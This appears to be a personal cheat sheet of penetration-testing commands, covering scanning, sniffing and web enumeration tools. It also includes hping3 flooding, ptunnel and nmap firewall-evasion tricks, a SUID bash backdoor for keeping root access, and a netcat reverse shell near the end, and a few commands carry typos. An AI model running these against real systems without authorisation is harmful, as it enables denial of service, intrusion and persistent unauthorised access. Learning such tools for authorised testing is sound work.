This is list over the most used commands when pen testing. This is just for a quick glance and look up table, with the description of what the commands does. It's taken from [here](https://www.youtube.com/watch?v=gL4j-a-g9pA&list=WL&index=28).
Some of the commands, have their own and more detailed description in the "tools" folder.

1. ping
The ping command, is for checking if a host is up. We can either send the default size package (64 bit) or customize it:
```
ping -s <size of package> <host>
```
When we are sending larger sizes of packages, we are testing the capabilities of the firewall of the host.
We can also flood the host with the `-f` flag

2. iftop
Iftop is used for monitoring real-time bandwidth usage on the network interfaces in Linux. I use it, when checking for the "flood" command in ping, to see if it's to much for the network:
```
iftop
```

3. hping3
This is a more detailed version of "ping", this allows us also to flood on a specific port:
```
hping3 -S --flood -V -p <port> <host>
```
Here we are using the flags:
- **S**: This is for specifying that we are using a TCP package
- **flood**: It's for telling that we are flooding the network
- **V**: For verbose output
- **p**: For the specified port
If we want a trace-route, to see the network path we are taking to get to a website we can also use hping3 to do this:
```
hping3 --traceroute -V -1 <website>
```
Here the `-1` specifies that we are using a IMCP package. If we are getting blocked by the firewall we can remove the `-1` and do this instead `-p 80 -S`, here we are using the TCP package.
If we really want to evade firewall rules, we can use the command:
```
hping3 --tracerout -V -p 80 -S -A --baseport 1337 <website>
```
Here we are getting the `traceroute`, with verbose mode, sending traffic to port 80, using the TCP package, while sending the "ACK" flag, and telling that our baseport is 1337.

4. ptunnel
ptunnel is also a more advanced version of ping, here we can send TCP packages over the IMCP tunnel for ECHO and REPLY. (This requires two machines).
**Target side instruction**:
- Run: `ptunnel`

**Attacker side instruction**:
- Run: `ptunnel -p <target ip> -lp <port> -da <dest address> -dp <dest port>`
	- `-p` is the proxy address of our target.
	- `-lp` for specifying our local port. 
	- `-da` for our destination address. (also our target)
	- `-dp` for our destination port (can use port 22)
We can now try to ssh into the target machine using the command:
```
ssh -p <port> <username>@<ip address>
```
This can be used to evade firewalls, that disallows this type of traffic.

5. tcpdump
This tool is used for monitoring real time tcp packages and visualizing them. We run this command:
```
tcpdump -i any <package>
```
Here the flags are:
- `-i`: For interface
- Here we normally specify the package to be imcp.

We can also store files with the dump on our local network with the command:
```
tcpdum -w <filename>.pcap -i <internet interface>
```
Where the internet interface is normally `eth0`
And now we can analyze the traffic:
```
tcpdump -r <filename>.pcap
```

6. nmap
This is one of the commands, that I'm running on a daily basis, this is for scanning entire networks, website, server, etc.
For scanning a network for mapping we are using:
```
nmap <target network>
```
There are **a lot** of flags in nmap (here are some that I personally use a lot):
- `-sn` for discovering hosts
- `-sV` for service discovery
- `-O` for OS detection
- `-Pn` for disabling ping probing
- `-sL` for quick host name scanning
- `--script vuln/malware` this is the standard flag for script, there are **a lot** more scripts 
- `-A` for scanning for **everything** (this takes a while)
- `-f` for fragmenting the packages (harder detection)
- `--source-port` for even more evading detection (53 for dns)
- `-D RND:10` for scanning with decoys (advance), here we are generating 10 different ip addresses, and say we are scanning from them.

8. masscan
Masscan is for scanning massive amounts of network, or just a large amount of networks. In the command, and flags, it's similar to nmap:
```
masscan -p <ports> <network> --rate=1000
```
But masscan also allows us to scan subnet ranges of networks, this can come in handy, when we are unsure of what we are dealing with:
```
masscan <subnet range> -p0-65535 --rate=10000
```

9. sl
The ls command is one of common command in Linux, this is listing files, folders, etc. in the command line, but there is also a `sl` command, this is for mistyping the ls command, and it brings a steam locomotive to the terminal. This is mostly for the fun of it.

11. whois
The `whois` command is also a command that I use on a daily basis. This is a command that tells us everything there is to know about a website:
```
whois <website>
```

12. whatweb
The `whatweb` command is command that looks a lot like the whois command, but it gives a better overview of what the website is using, and what it's build on (server, powered by), all the juicy stuff, that we are loving:
```
whatweb <website>
```

13. curl
The `curl` command is a default command that is in _almost_ every distro that we are downloading, that can also be very helpful, since we can display header information from the request that we are making to a website.
```
curl <website>
```

14. Nikto
Nikto is a great, all in one scanner for a fast overview of a web app:
```
nikto -h <website>
```
This gives us a quick view of what is wrong with the website.

15. gobuster
Go buster is great for subdir hunting, and I use is profoundly:
```
gobuster dir <website> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
We can also discover other things than directories, maybe we also want to enumerate dns, we can use that with `dns` instead of `dir`

You can also use your own wordlists or take some from github.

16. sublist3r
Sublist3r is a tool, that's like gobuster, also for subdirectory enumeration. This is actually a tool that I use more than gobuster, we are using the command:
```
sublist3r -d <domain>
```

17. wpscan
If we pen testing a WordPress site, then wpscan is a must have tool in the toolbox. This is where we are scanning WordPress sites for vulnerabilities in its plugins, the users on the site, the themes and much more. 
But for this we need a token (it's free on their website):
```
wpscan --url <domain> --api-token <api token>
```
This gives a very nice output with colors of things that's wrong or vulnerable.

18. amass
Amass is also a tool that we can use for sub domain enumeration, this gives us a lot more information about the website, and also what services it uses (mails, etc.):
```
amass enum -d <domain>
```

19. bash (backdoor)
This is going  to be a little introduction on setting up a backdoor on a remote shell (or you own)

We are going to be in the remote shell (with admin privileges) and running:
```
chmod +s /bin/bash
```
Here we are `chmod` "changing modification" of the unique `+s` ssid, on the bash shell on the remote shell. This is so that if they in the future are changing the permission of the compromised user, we can easily gain root privileges again by running the command:
```
bash -p
```

20. tshark
tshark is the terminal brother of wireshark, since that wireshark can be a bit overwhelming to use for first time users.
We can run tshark with:
```
tshark -V -c <#packages to capture> -i <internet interface>
```
If this seems overwhelming at first, we can filter in the packages:
```
tshark -Y'http.request.method == "GET"' -i <internet interface>
```
Where `-Y` is the filter that we are applying.
We can also send the output to a file, for further analysis:
```
tshark -i <internet interface> -w <filename>.pcap
```
And analyze it with:
```
tshark -r <filename>.pcap -qz enpoints,ip
```

22. tmux
Tmux is a "terminal multiplexer", this means that we can use multiple terminals at the same time.
Tmux has a lot of different commands, and can be overwhelming as a beginner, but it's worth the investment of time.
Here is a [guide](https://www.linuxtrainingacademy.com/tmux-tutorial/).

23. nc
NetCat also known as nc, is a great tool for  network connections, to install it we use:
```
apt install netcat-traditional
```
When using netcat on both the _target machine_ and the _attacker machine_. 

We can run a reverse shell:
**Attackers side**:
We are running:
`nc -lvp <port running on>` here we are waiting for the reverse shell, since on a reverse shell, the target is reaching out for us.

**Targets side**:
We are running:
`nc -e /bin/sh <ip address> <port>`
Here we are reaching out to the ip address and port, and creating a /bin/sh shell on the attackers machine.

We can also set up a network server:
**Attacker machine**: `nc -lvp <port>`
**Target machine**: `nc -v <ip address> <port>`
